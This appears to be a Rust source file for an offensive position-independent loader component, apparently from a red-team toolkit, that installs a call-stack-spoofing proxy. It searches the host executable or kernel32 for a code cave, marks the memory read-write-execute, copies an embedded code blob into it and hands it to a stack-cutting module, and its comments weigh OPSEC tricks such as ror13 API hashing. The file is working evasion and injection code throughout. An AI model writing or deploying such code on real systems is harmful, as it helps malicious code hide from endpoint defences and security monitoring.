#![no_std]
#![no_main]

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }

use core::{mem, ptr::{null, null_mut}};

use crystal_sdk::{append_data, get_resource, import, mem::memcpy};
use crystal_bindings::tcg::{DLLDATA, ParseDLL};
use stackcutting::{PROXY, get_frame, get_return};
use winapi::{shared::{basetsd::SIZE_T, minwindef::{DWORD, HMODULE, LPVOID, PDWORD}, ntdef::LPCSTR}, um::winnt::{IMAGE_SCN_MEM_EXECUTE, IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}};

import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
import!(KERNEL32!VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD) -> LPVOID);
import!(KERNEL32!GetModuleHandleA(lpModuleName: LPCSTR) -> HMODULE);

append_data!(my_proxy, findAppendedPROXY, "rPROXYPIC");

unsafe extern "C" {
    fn configstackcutting(proxy: PROXY, retaddr: *const u8, frameaddr: *const u8);
    fn init();
}

fn find_code_cave(dll_base: *const u8, length: u32) -> Option<*mut u8>{
    unsafe {
        let mut data: DLLDATA = mem::zeroed();
        let mut section_hdr;
        let mut section_nxt;
        let num_of_sections;

        /* parse our DLL! */
        ParseDLL(dll_base as _, &mut data);

        /* loop through our sections */
        num_of_sections = (*data.NtHeaders).FileHeader.NumberOfSections;
        section_hdr = (data.OptionalHeader as usize + (*data.NtHeaders).FileHeader.SizeOfOptionalHeader as usize) as *const IMAGE_SECTION_HEADER;
        for _ in 0..num_of_sections-1 {
            /* look for our eXecutable section, there-in lives our... code cave */
            if (*section_hdr).Characteristics & IMAGE_SCN_MEM_EXECUTE == IMAGE_SCN_MEM_EXECUTE {
                /* let's look at our next section, we need it to get the right size of the code cave */
                section_nxt = &*section_hdr.add(1);

                /* calculate the size, based on section headers */
                let size = section_nxt.VirtualAddress - (*section_hdr).VirtualAddress;

                /* calculate the size of our code cave */
                let cave_size = size - (*section_hdr).SizeOfRawData;

                /* if we fit, return it */
                if length < cave_size {
                    return Some((dll_base as usize + (section_nxt.VirtualAddress - cave_size) as usize) as _);
                }
                /* advance to our next section */
                section_hdr = section_hdr.add(1);
            }
        }
        None
    }
}

/*
 * Install our proxy PIC somewhere in memory, ideally in image memory (e.g., backed by a module on disk). This is
 * a risky and unmasked operation... but once this is done, we've got a nice call stack munging proxy that can run
 * whatever we give to it. And, that's pretty cool.
 */
#[unsafe(no_mangle)]
extern "C" fn SetupProxy() -> PROXY {
    unsafe {
        let src = get_resource(findAppendedPROXY());
        let mut h_module;
        let mut proxy;
        let mut old_prot = 0u32;

        /* (1) we're going to search for a code cave in... our executable */
        h_module = GetModuleHandleA(null());
        proxy = find_code_cave(h_module as _, src.len() as _);

        /* (2) if we can't find a code cave in our executable, let's find one elsewhere. How about kernel32?
         * And, a good place to note: bad idea on x86. There are reserved sections between sections breaking
         * my code cave calculation algorithm. You'll end up in memory you don't want to be in. */
        if proxy.is_none() {
            /*
             * Note, we could use a stack string here or findModuleByHash with the ror13 hash of KERNEL32
             * But, my goal is demonstration of concepts and not leetsy-neatsy-wow, I applied ro13 999x
             * style "mastery of OPSEC"
             */
            h_module = GetModuleHandleA(c"KERNEL32".as_ptr());
            proxy = find_code_cave(h_module as _, src.len() as _);
        }
        /* (3) if there's no space in our executable, then just do a VirtualAlloc--life goes on */
        if proxy.is_none() {
            proxy = Some(VirtualAlloc(null_mut(), 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE) as _);
        }

        let round_down_addr = {
            proxy.unwrap_unchecked() as usize - (proxy.unwrap_unchecked() as usize % 0x1000)
        };

        /* change the permissions of our PIC to RWX */
        VirtualProtect(round_down_addr as _, 0x1000, PAGE_EXECUTE_READWRITE, &mut old_prot);

        /* copy our proxy PIC over */
        memcpy(proxy.unwrap_unchecked(), src.as_ptr(), src.len());

        /* return proxy */
        mem::transmute::<_, PROXY>(proxy.unwrap_unchecked())
    }
}

#[unsafe(no_mangle)]
extern "C" fn go() {
    unsafe {
        let ret_addr = get_return();
        let frame_addr = *(get_frame() as *const usize);

        /* setup our proxy */
        let proxy = SetupProxy();

        /* push it over to our other module */
        configstackcutting(proxy, ret_addr as _, frame_addr as _);
        
        /* start our init chain */
        init();
    }
}
